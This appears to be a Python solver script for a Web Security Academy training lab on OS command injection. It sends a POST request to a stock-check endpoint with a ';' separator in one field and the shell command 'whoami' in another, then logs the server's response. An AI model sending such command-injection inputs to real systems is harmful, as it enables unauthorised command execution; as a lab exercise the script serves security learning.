from web_security_academy.core.logger import logger


def solve_lab(session):
    path = "/product/stock"
    data = {"productId": ";", "storeId": "whoami"}

    logger.info(
        f'Performing an OS command injection attack by sending a POST request to "{path}" with the following data:'
    )
    logger.info(f"{data}")

    resp = session.post_path(path, data=data)
    logger.success("POST request sent successfully with the following response:")
    logger.success(resp.text.strip())
